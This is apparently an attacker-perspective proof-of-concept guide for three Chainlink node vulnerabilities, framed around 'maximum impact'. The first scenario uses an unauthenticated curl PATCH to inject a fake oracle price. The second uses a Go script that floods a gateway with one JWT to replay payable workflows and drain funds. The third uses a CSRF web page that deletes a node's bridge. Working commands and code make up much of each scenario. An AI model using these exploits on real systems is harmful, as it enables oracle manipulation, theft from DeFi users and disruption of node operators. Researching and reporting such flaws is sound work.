# Chainlink Attack PoC: Maximum Impact Scenarios

This document provides a step-by-step guide to reproducing and exploiting the identified vulnerabilities in Chainlink from an attacker's perspective.

---

## Scenario 1: Oracle Report Manipulation via Unauthenticated Task Resumption (CL-03)

**Objective:** Force a Chainlink node to report a malicious price value to a decentralized oracle contract, potentially triggering liquidations or incorrect payouts.

**Attacker Profile:** Network eavesdropper or malicious External Adapter provider.

### Step-by-Step Reproduction:

1.  **Preparation:**
    *   Identify a job on a Chainlink node that uses an `Async` Bridge task. This is common for long-running processes where the External Adapter (EA) calls back to the node.
    *   The node will expose a `responseURL` to the EA, typically: `https://<node-ip>/v2/resume/<task-uuid>`.

2.  **Intercept the Task ID:**
    *   The `task-uuid` is sent in the body of the POST request from the node to the EA.
    *   **Attack Action:** Monitor the network traffic to the EA or compromise the EA server to log incoming requests.
    *   **Captured Data:**
        ```json
        {
          "id": "job-run-123",
          "data": { ... },
          "responseURL": "https://chainlink-node.com/v2/resume/550e8400-e29b-41d4-a716-446655440000"
        }
        ```

3.  **Execute the Exploit:**
    *   The `/v2/resume/:runID` endpoint is unauthenticated. The attacker does not need a session cookie or API key.
    *   **Attack Action:** Send a faked result to the node before the real EA responds.
        ```bash
        curl -X PATCH https://chainlink-node.com/v2/resume/550e8400-e29b-41d4-a716-446655440000 \
             -H "Content-Type: application/json" \
             -d '{"value": "999999.99"}'
        ```

4.  **Verification:**
    *   Check the Node UI or logs. The job run will immediately resume using the value `999999.99` provided by the attacker.
    *   If this node is part of an OCR (Off-Chain Reporting) cluster, the malicious value will be included in the observation. If the attacker controls enough nodes or intercepts enough IDs, they can shift the median and manipulate the final on-chain price.

**Maximum Impact:** Total compromise of oracle data integrity leading to massive financial loss in DeFi protocols.

---

## Scenario 2: Fund Draining via JWT Replay Race (CL-01)

**Objective:** Execute a "Payable" workflow multiple times using a single valid user authorization.

**Attacker Profile:** Malicious user or attacker who has intercepted a single valid JWT trigger request.

### Step-by-Step Reproduction:

1.  **Identification:**
    *   Target the Chainlink Gateway's `http-capabilities` handler which uses JWTs for `workflows.execute` requests.

2.  **Capture a Valid Request:**
    *   Obtain one valid signed JWT for a workflow execution.
    *   **JWT Body Example:**
        ```json
        {
          "digest": "0x...",
          "jti": "unique-token-id-001",
          "exp": 1717596700
        }
        ```

3.  **Launch the Race Attack:**
    *   The vulnerability is a TOCTOU (Time-of-Check to Time-of-Use) in `workflow_metadata_handler.go`.
    *   **Attack Action:** Use a script to flood the Gateway with 50+ identical requests within a millisecond window.
    *   **Go Exploit Snippet:**
        ```go
        func attack(url string, jwt string, payload string) {
            for i := 0; i < 50; i++ {
                go func() {
                    req, _ := http.NewRequest("POST", url, bytes.NewBuffer([]byte(payload)))
                    req.Header.Set("Authorization", "Bearer " + jwt)
                    http.DefaultClient.Do(req)
                }()
            }
        }
        ```

4.  **Verification:**
    *   Observe the Gateway logs. Instead of 1 "Success" and 49 "Already Used" errors, you will see multiple "Processing request" entries for the same `jti`.
    *   Each successful bypass results in the Gateway forwarding an execution command to the Decentralized Oracle Network (DON).

**Maximum Impact:** If the workflow involves a "Transfer" capability (e.g., CCIP or a custom payout workflow), the recipient receives the funds multiple times, potentially draining the workflow's source account.

---

## Scenario 3: Cross-Site Request Forgery (CSRF) on Node Configuration (CL-04/Audit)

**Objective:** Change a Node's configuration or delete a bridge via a victim's browser.

**Attacker Profile:** Host of a malicious website visited by a Chainlink Node Operator.

### Step-by-Step Reproduction:

1.  **Craft Malicious Page:**
    *   The Chainlink Node web router lacks explicit CSRF protection (no CSRF tokens).
    *   **Note:** This is partially mitigated by `SameSite=Strict` on session cookies, but older browsers or misconfigurations (e.g. proxy stripping flags) leave it exposed.

2.  **Attack Action:** The attacker hosts a page that sends a hidden form or fetch request to the node's local/internal IP.
    ```html
    <html>
      <body>
        <script>
          // Attempt to delete a bridge named 'main-bridge'
          fetch('http://chainlink-node.internal:6688/v2/bridge_types/main-bridge', {
            method: 'DELETE',
            credentials: 'include' // Uses the operator's active session
          });
        </script>
      </body>
    </html>
    ```

3.  **Victim Interaction:**
    *   The Node Operator, logged into their node in one tab, visits the attacker's site in another.

4.  **Verification:**
    *   The browser sends the DELETE request with the session cookie. The node accepts it and deletes the bridge, causing all jobs depending on it to fail.

**Maximum Impact:** Disruption of node operations and potential credential theft (if combined with CL-04 to log secrets).
